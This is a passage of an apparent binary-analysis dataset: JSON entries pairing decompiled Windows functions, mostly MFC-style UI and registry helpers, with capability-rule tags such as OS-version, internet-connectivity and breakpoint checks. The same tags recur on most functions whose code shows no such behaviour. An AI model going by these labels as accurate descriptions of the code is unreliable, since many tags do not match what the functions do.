        "decompiled_code": "\nvoid __cdecl fcn.00437c50(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        fcn.00437a21(arg_8h, arg_ch, \"%I64u\", 0xf117, *arg_10h);\n    }\n    else {\n        fcn.00437a21(arg_8h, arg_ch, \"%I64u\", 0xf117, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "00437c98": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437c98(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint hWnd;\n    \n    hWnd = fcn.00437a0a(arg_ch);\n    if (*arg_8h == 0) {\n        fcn.00434b8c(hWnd, arg_10h);\n    }\n    else {\n        (*_sym.imp.USER32.dll_GetWindowTextLengthA)(hWnd);\n        (*_sym.imp.USER32.dll_GetWindowTextA)(hWnd, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "00437cd6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_90h\n\nvoid __cdecl\nfcn.00437cd6(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_90h;\n    uint var_50h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    iVar2 = **(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = *0x4640c8;\n    if (iVar2 != 0) {\n        fcn.0041205e(unaff_EBP + -0x90, *(unaff_EBP + 0x1c), *(unaff_EBP + 0xc));\n        fcn.0041205e(unaff_EBP + -0x50, *(unaff_EBP + 0x1c), *(unaff_EBP + 0x14));\n        piVar1 = fcn.004290ee();\n        iVar2 = (**(*piVar1 + 0xc))();\n        *(unaff_EBP + 8) = iVar2 + 0x10;\n        *(unaff_EBP + -4) = 0;\n        fcn.00438a1d(unaff_EBP + 8, *(unaff_EBP + 0x20), unaff_EBP + -0x90, unaff_EBP + -0x50);\n        fcn.00438732(*(unaff_EBP + 8), 0x30, *(unaff_EBP + 0x20));\n        fcn.00401810();\n        fcn.0043763c();\n        fcn.00401200();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 465
    },
    "0043810d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043810d(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    uint hWnd;\n    int32_t iVar1;\n    uint uVar2;\n    \n    hWnd = fcn.00437a0a(arg_ch);\n    if (*arg_8h == 0) {\n        fcn.00434b8c(hWnd, *arg_10h);\n    }\n    else {\n        iVar1 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)(hWnd);\n        uVar2 = fcn.0040a932(iVar1, iVar1 + 1);\n        (*_sym.imp.USER32.dll_GetWindowTextA)(hWnd, uVar2);\n        fcn.004059a0(0xffffffff);\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "0043815f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043815f(int32_t *hWnd, uint arg_ch, uint *lParam)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    piVar2 = hWnd;\n    fcn.004375fd(arg_ch);\n    fcn.0042dbd3(arg_ch, &hWnd);\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (*piVar2 == 0) {\n        (*_sym.imp.USER32.dll_SendMessageA)(hWnd, 0x18c, 0xffffffff, *lParam);\n    }\n    else {\n        iVar3 = (*_sym.imp.USER32.dll_SendMessageA)(hWnd, 0x188, 0, 0);\n        if (iVar3 == -1) {\n            fcn.00401810();\n        }\n        else {\n            uVar4 = (*pcVar1)(hWnd, 0x18a, iVar3, 0);\n            uVar4 = fcn.0040a932(uVar4);\n            (*pcVar1)(hWnd, 0x189, iVar3, uVar4);\n        }\n        fcn.004059a0(0xffffffff);\n    }\n    return;\n}\n",
        "token_count": 285
    },
    "004381f3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004381f3(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *hWnd;\n    int32_t iVar2;\n    \n    hWnd = arg_8h;\n    fcn.004375fd(arg_ch);\n    fcn.0042dbd3(arg_ch, &arg_8h);\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (*hWnd == 0) {\n        iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0x1a2, 0xffffffff, *arg_10h);\n        if (-1 < iVar2) {\n            (*pcVar1)(arg_8h, 0x186, iVar2, 0);\n        }\n    }\n    else {\n        fcn.0043815f(hWnd, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 215
    },
    "00438253": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00438253(int32_t *hWnd, uint arg_ch, uint *lParam)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    piVar1 = hWnd;\n    fcn.004375fd(arg_ch);\n    fcn.0042dbd3(arg_ch, &hWnd);\n    puVar2 = lParam;\n    if (*piVar1 == 0) {\n        iVar3 = (*_sym.imp.USER32.dll_SendMessageA)(hWnd, 0x14d, 0xffffffff, *lParam);\n        if (iVar3 == -1) {\n            fcn.00434b8c(hWnd, *puVar2);\n        }\n    }\n    else {\n        iVar3 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)(hWnd);\n        if (iVar3 < 1) {\n            uVar4 = fcn.004019c0(0xff, 0x100);\n        }\n        else {\n            uVar4 = fcn.0040a932(iVar3, iVar3 + 1);\n        }\n        (*_sym.imp.USER32.dll_GetWindowTextA)(hWnd, uVar4);\n        fcn.004059a0(0xffffffff);\n    }\n    return;\n}\n",
        "token_count": 289
    },
    "004382e5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004382e5(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *hWnd;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    hWnd = arg_8h;\n    fcn.004375fd(arg_ch);\n    fcn.0042dbd3(arg_ch, &arg_8h);\n    puVar2 = arg_10h;\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (*hWnd == 0) {\n        iVar3 = (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0x158, 0xffffffff, *arg_10h);\n        if (iVar3 < 0) {\n            fcn.00434b8c(arg_8h, *puVar2);\n        }\n        else {\n            (*pcVar1)(arg_8h, 0x14e, iVar3, 0);\n        }\n    }\n    else {\n        fcn.00438253(hWnd, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 255
    },
    "0043846f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043846f(int32_t param_1)\n\n{\n    if (*(param_1 + 0x54) != 0) {\n    // WARNING: Could not recover jumptable at 0x0043847a. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(**(param_1 + 0x54) + 0x24))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "00438534": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00438534(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.0040a3cd();\n    if (piVar1 != NULL) {\n        iVar2 = (**(*piVar1 + 0x120))();\n        if ((iVar2 != 0) && (piVar1[0x1f] != 0)) {\n    // WARNING: Could not recover jumptable at 0x0043855a. Too many branches\n    // WARNING: Treating indirect jump as call\n            (**(*piVar1[0x1f] + 100))();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "00438732": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00438665)\n// WARNING: Removing unreachable block (ram,0x004386b6)\n\nvoid fcn.00438732(uint param_1, uint32_t param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack276;\n    int32_t iStack272;\n    uchar auStack268 [259];\n    uchar uStack9;\n    uint uStack8;\n    \n    uStack8 = 0x43873a;\n    iVar4 = fcn.00444bf8();\n    if (*(iVar4 + 4) != NULL) {\n    // WARNING: Could not recover jumptable at 0x00438746. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(**(iVar4 + 4) + 0x98))();\n        return;\n    }\n    uStack8 = *0x4640c8;\n    fcn.00438534(0);\n    iVar4 = fcn.00438561(0, &stack0xfffffef0);\n    if (iVar4 != iStack272) {\n        (*_sym.imp.USER32.dll_EnableWindow)(iVar4, 1);\n    }\n    if ((iVar4 == 0) || (piVar1 = (*_sym.imp.USER32.dll_SendMessageA)(iVar4, 0x376, 0, 0),  piVar1 == NULL)) {\n        piVar1 = NULL;\n    }\n    iStack276 = 0;\n    if ((piVar1 != NULL) && (iStack276 = *piVar1,  param_3 != 0)) {\n        *piVar1 = param_3 + 0x30000;\n    }\n    if (((param_2 & 0xf0) == 0) && ((uVar2 = param_2 & 0xf,  uVar2 < 2 || ((2 < uVar2 && (uVar2 < 5)))))) {\n        param_2 = param_2 | 0x30;\n    }\n    auStack268[0] = 0;\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, &stack0xfffffef4, 0x104);\n    if (iVar3 == 0x104) {\n        uStack9 = 0;\n    }\n    (*_sym.imp.USER32.dll_MessageBoxA)(iVar4, param_1, &stack0xfffffef4, param_2);\n    if (piVar1 != NULL) {\n        *piVar1 = iStack276;\n    }\n    if (iStack272 != 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(iStack272, 1);\n    }\n    fcn.00438534(1);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 645
    },
    "004388a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004388a0(int32_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    \n    iVar4 = 0;\n    uVar1 = *arg_ch;\n    puVar5 = arg_ch;\n    while (uVar1 != 0) {\n        if (*puVar5 == 0x25) {\n            uVar1 = puVar5[1];\n            if ((uVar1 < '1') || ('9' < uVar1)) {\n                if ((uVar1 < 'A') || ('Z' < uVar1)) goto code_r0x004388f9;\n                if (uVar1 < ':') goto code_r0x004388d7;\n                iVar3 = uVar1 + -0x38;\n            }\n            else {\ncode_r0x004388d7:\n                iVar3 = uVar1 + -0x31;\n            }\n            puVar5 = puVar5 + 2;\n            if (arg_14h <= iVar3) goto code_r0x00438908;\n            iVar3 = *(arg_10h + iVar3 * 4);\n            if (iVar3 != 0) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar3);\n                iVar4 = iVar4 + iVar3;\n            }\n        }\n        else {\ncode_r0x004388f9:\n            if ((*(*puVar5 + 0x468721) & 4) != 0) {\n                iVar4 = iVar4 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            puVar5 = puVar5 + 1;\ncode_r0x00438908:\n            iVar4 = iVar4 + 1;\n        }\n        uVar1 = *puVar5;\n    }\n    puVar5 = fcn.004019c0(iVar4);\n    do {\n        while( true ) {\n            if (*arg_ch == 0) {\n                fcn.004059a0(puVar5 - *arg_8h);\n                return;\n            }\n            uVar1 = *arg_ch;\n            if (uVar1 == 0x25) break;\ncode_r0x00438973:\n            if ((*(uVar1 + 0x468721) & 4) != 0) {\n                *puVar5 = uVar1;\n                puVar5 = puVar5 + 1;\n                arg_ch = arg_ch + 1;\n            }\n            *puVar5 = *arg_ch;\n            puVar5 = puVar5 + 1;\n            arg_ch = arg_ch + 1;\n        }\n        uVar2 = arg_ch[1];\n        if ((uVar2 < '1') || ('9' < uVar2)) {\n            if ((uVar2 < 'A') || ('Z' < uVar2)) goto code_r0x00438973;\n            if (uVar2 < ':') goto code_r0x00438943;\n            iVar4 = uVar2 + -0x38;\n        }\n        else {\ncode_r0x00438943:\n            iVar4 = uVar2 + -0x31;\n        }\n        arg_ch = arg_ch + 2;\n        if (iVar4 < arg_14h) {\n            iVar4 = *(arg_10h + iVar4 * 4);\n            if (iVar4 != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyA)(puVar5, iVar4);\n                iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar5);\n                puVar5 = puVar5 + iVar4;\n            }\n        }\n        else {\n            *puVar5 = 0x3f;\n            puVar5 = puVar5 + 1;\n        }\n    } while( true );\n}\n",
        "token_count": 885
    },
    "00438be0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438be0(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piStack8;\n    int32_t *piStack4;\n    \n    pcVar1 = _sym.imp.USER32.dll_LoadCursorA;\n    piStack8 = param_1;\n    piStack4 = param_1;\n    if ((*0x466dec == 0) && (*0x466dec = (*_sym.imp.USER32.dll_LoadCursorA)(0, 0x7f8b),  *0x466dec == 0)) {\n        iVar2 = fcn.00444bf8();\n        *0x466dec = (*pcVar1)(*(iVar2 + 0xc), 0x7901);\n        if (*0x466dec == 0) {\n            return;\n        }\n    }\n    (**(*param_1 + 0xc))(0xe145, 0, 0, &piStack8);\n    return;\n}\n",
        "token_count": 223
    },
    "00438c3a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00438c3a(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t in_ECX;\n    int32_t iVar8;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar8 = 0;\n    if (*(in_ECX + 100) == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.USER32.dll_GetCapture)();\n    iVar2 = fcn.0040f39d(arg_8h, arg_ch);\n    if (iVar2 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = *(iVar2 + 0x1c);\n    }\n    iVar3 = fcn.0042c69d();\n    uVar4 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n    fcn.0042b432(uVar4);\n    iVar5 = fcn.0042c69d();\n    var_ch = 0;\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    if (iVar2 != 0) {\n        iVar8 = (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(iVar2, 0);\n    }\n    if ((iVar5 == 0) || (iVar7 = (*_sym.imp.USER32.dll_GetDesktopWindow)(),  iVar2 == iVar7)) {\n        uVar4 = *0x466de8;\n        if (iVar1 == *(in_ECX + 0x1c)) {\n            (*_sym.imp.USER32.dll_ReleaseCapture)();\n            uVar4 = *0x466de8;\n        }\ncode_r0x00438d27:\n        (*_sym.imp.USER32.dll_SetCursor)(uVar4);\n        goto code_r0x00438d2d;\n    }\n    if (iVar2 == 0) {\ncode_r0x00438cfc:\n        if (iVar6 != iVar8) goto code_r0x00438d01;\n    }\n    else {\n        if (iVar6 == iVar8) {\n            uVar4 = *(in_ECX + 0x1c);\n            iVar7 = fcn.0043f7c2();\n            if (iVar7 != 0) {\n                var_ch = 1;\n                if (iVar5 != iVar3) {\n                    iVar2 = 0;\n                    goto code_r0x00438d2d;\n                }\n                uVar4 = *0x466dec;\n                if (iVar1 != *(in_ECX + 0x1c)) {\n                    (*_sym.imp.USER32.dll_SetCapture)(*(in_ECX + 0x1c));\n                    uVar4 = *0x466dec;\n                }\n                goto code_r0x00438d27;\n            }\n            goto code_r0x00438cfc;\n        }\ncode_r0x00438d01:\n        iVar2 = 0;\n    }\n    if (iVar1 == *(in_ECX + 0x1c)) {\n        (*_sym.imp.USER32.dll_ReleaseCapture)(uVar4);\n    }\ncode_r0x00438d2d:\n    if (arg_10h != NULL) {\n        *arg_10h = var_ch;\n    }\n    return iVar2;\n}\n",
        "token_count": 775
    },
    "00438d42": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00438d42(int32_t arg_8h, uint *arg_ch)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint var_28h;\n    uint lpPoint;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    iVar3 = arg_8h;\n    uVar1 = *(arg_8h + 4);\n    if ((uVar1 == 0x367) || ((uVar1 == 0x100 && (*(arg_8h + 8) == 0x1b)))) {\n        uVar6 = *(arg_8h + 4);\ncode_r0x00438f32:\n        (*_sym.imp.USER32.dll_PeekMessageA)(iVar3, 0, uVar6, uVar6, 1);\n        return 0;\n    }\n    if (((uVar1 < 0x200) || (0x209 < uVar1)) && ((uVar1 < 0xa0 || (0xa9 < uVar1)))) {\n        if ((uVar1 != 0x112) && ((uVar1 < 0x100 || (0x109 < uVar1)))) {\n            iVar4 = (*_sym.imp.USER32.dll_PeekMessageA)(arg_8h, 0, *(arg_8h + 4), *(arg_8h + 4), 1);\n            if (iVar4 == 0) {\n                return 1;\n            }\ncode_r0x00438e7f:\n            (*_sym.imp.USER32.dll_DispatchMessageA)(iVar3);\n            return 1;\n        }\n        iVar4 = (*_sym.imp.USER32.dll_GetCapture)();\n        pcVar2 = _sym.imp.USER32.dll_PeekMessageA;\n        if (iVar4 != 0) {\n            (*_sym.imp.USER32.dll_ReleaseCapture)();\n            do {\n                iVar4 = (*pcVar2)(&var_28h, 0, 0x200, 0x209, 3);\n            } while (iVar4 != 0);\n        }\n        iVar4 = (*pcVar2)(iVar3, 0, *(iVar3 + 4), *(iVar3 + 4), 0);\n        if (iVar4 == 0) goto code_r0x00438f0b;\n        (*_sym.imp.USER32.dll_GetMessageA)(iVar3, 0, *(iVar3 + 4), *(iVar3 + 4));\n        iVar4 = (**(*var_4h + 0x100))(iVar3);\n        if (iVar4 != 0) goto code_r0x00438f0b;\n        (*_sym.imp.USER32.dll_TranslateMessage)(iVar3);\n        uVar1 = *(iVar3 + 4);\n        if ((uVar1 != 0x112) && ((uVar1 < 0x104 || (0x107 < uVar1)))) goto code_r0x00438f0b;\n    }\n    else {\n        iVar4 = fcn.00438c3a(*(arg_8h + 0x14), *(arg_8h + 0x18), &arg_8h);\n        if (iVar4 == 0) {\n            return 1;\n        }\n        if (arg_8h == 0) {\n            (*_sym.imp.USER32.dll_PeekMessageA)(iVar3, 0, *(iVar3 + 4), *(iVar3 + 4), 1);\n            goto code_r0x00438e7f;\n        }\n        if (*(iVar3 + 4) != 0x201) {\n            (*_sym.imp.USER32.dll_PeekMessageA)(iVar3, 0, *(iVar3 + 4), *(iVar3 + 4), 1);\n            return 1;\n        }\n        iVar5 = (*_sym.imp.USER32.dll_SendMessageA)(iVar4, 0x84, 0, CONCAT22(*(iVar3 + 0x18), *(iVar3 + 0x14)));\n        if ((iVar5 != 5) && (iVar5 != 3)) {\n            if (iVar5 == 1) {\n                uVar6 = fcn.00438a43(iVar4, *(iVar3 + 0x14), iVar4);\n            }\n            else {\n                uVar6 = fcn.00438ab1(iVar5);\n            }\n            *arg_ch = uVar6;\n            uVar6 = *(iVar3 + 4);\n            goto code_r0x00438f32;\n        }\n        (*_sym.imp.USER32.dll_ReleaseCapture)();\n        (*_sym.imp.USER32.dll_GetMessageA)(iVar3, 0, 0xa1, 0xa1);\n    }\n    (*_sym.imp.USER32.dll_DispatchMessageA)(iVar3);\ncode_r0x00438f0b:\n    (*_sym.imp.USER32.dll_GetCursorPos)(&lpPoint);\n    fcn.00438c3a(lpPoint, var_8h, 0);\n    return 1;\n}\n",
        "token_count": 1137
    },
    "00438f42": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438f42(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint lpMsg;\n    uint lpPoint;\n    uint var_14h;\n    int32_t *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (((*(param_1 + 100) != 1) && (iVar3 = fcn.00438be0(),  iVar3 != 0)) &&\n       (iVar3 = (*_sym.imp.USER32.dll_PeekMessageA)(&lpMsg, *(param_1 + 0x1c), 0x367, 0x367, 3),  iVar3 == 0)) {\n        iVar3 = *(param_1 + 100);\n        *(param_1 + 100) = 1;\n        if (((iVar3 == 2) || (*(param_1 + 0x7c) == NULL)) || (iVar4 = (**(**(param_1 + 0x7c) + 0x60))(1),  iVar4 != 0))\n        {\n            if (iVar3 == 0) {\n                (*_sym.imp.USER32.dll_PostMessageA)(*(param_1 + 0x1c), 0x111, 0xe145);\n                *(param_1 + 100) = 2;\n            }\n            else {\n                var_ch = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x1c), 0x362, 0xe002, 0);\n                if (var_ch == 0) {\n                    var_ch = 0xe001;\n                }\n                var_8h = 0;\n                (*_sym.imp.USER32.dll_GetCursorPos)(&lpPoint);\n                fcn.00438c3a(lpPoint, var_14h, 0);\n                var_4h = 0;\n                iVar3 = fcn.00444bf8();\n                piVar1 = *(iVar3 + 4);\n                var_10h = piVar1;\n                do {\n                    while( true ) {\n                        if (*(param_1 + 100) == 0) goto code_r0x0043906a;\n                        iVar3 = (*_sym.imp.USER32.dll_PeekMessageA)(&lpMsg, 0, 0, 0, 0);\n                        if (iVar3 != 0) break;\n                        iVar3 = (**(*piVar1 + 0x60))(var_4h);\n                        var_4h = var_4h + 1;\n                        if (iVar3 == 0) {\n                            var_4h = 0;\n                            (*_sym.imp.USER32.dll_WaitMessage)();\n                        }\n                    }\n                    iVar3 = fcn.00438d42(&lpMsg, &var_8h);\n                } while (iVar3 != 0);\ncode_r0x0043906a:\n                pcVar2 = _sym.imp.USER32.dll_ReleaseCapture;\n                *(param_1 + 100) = 0;\n                (*pcVar2)();\n                uVar5 = (*_sym.imp.USER32.dll_SetCapture)(*(param_1 + 0x1c));\n                fcn.0042b432(uVar5);\n                (*pcVar2)();\n                pcVar2 = _sym.imp.USER32.dll_SendMessageA;\n                (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x1c), 0x362, var_ch, 0);\n                if (*(param_1 + 0x7c) != NULL) {\n                    (**(**(param_1 + 0x7c) + 0x60))(0);\n                }\n                if (var_8h != 0) {\n                    if (var_8h == -1) {\n                        (*pcVar2)(*(param_1 + 0x1c), 0x111, 0xe147, 0);\n                    }\n                    else {\n                        (**(*var_10h + 0xac))(var_8h, 1);\n                    }\n                }\n                (*_sym.imp.USER32.dll_PostMessageA)(*(param_1 + 0x1c), 0x36a, 0, 0);\n            }\n        }\n        else {\n            (**(**(param_1 + 0x7c) + 0x60))(0);\n            *(param_1 + 100) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 1012
    },
    "004390e9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004390e9(uint lpAppName, uint lpValueName, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint lpString;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    if (*(in_ECX + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_wsprintfA)(&lpString, 0x44e928, arg_10h);\n        (*_sym.imp.KERNEL32.dll_WritePrivateProfileStringA)(lpAppName, lpValueName, &lpString, *(in_ECX + 100));\n    }\n    else {\n        iVar1 = fcn.00446904(lpAppName);\n        if (iVar1 != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(iVar1, lpValueName, 0, 4, &arg_10h, 4);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n        }\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 247
    },
    "0043916b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043916b(uint lpAppName, int32_t lpValueName, int32_t lpString)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x50) == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_WritePrivateProfileStringA)(lpAppName, lpValueName, lpString, *(in_ECX + 100));\n        return uVar3;\n    }\n    if (lpValueName == 0) {\n        iVar1 = fcn.00446873();\n        if (iVar1 != 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegDeleteKeyA)(iVar1, lpAppName);\n            goto code_r0x004391d7;\n        }\n    }\n    else {\n        iVar1 = fcn.00446904(lpAppName);\n        if (lpString == 0) {\n            if (iVar1 != 0) {\n                iVar2 = (*_sym.imp.ADVAPI32.dll_RegDeleteValueA)(iVar1, lpValueName);\ncode_r0x004391d7:\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n                return iVar2 == 0;\n            }\n        }\n        else if (iVar1 != 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(iVar1, lpValueName, 0, 1, lpString, iVar2 + 1);\n            goto code_r0x004391d7;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 385
    },
    "00439201": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
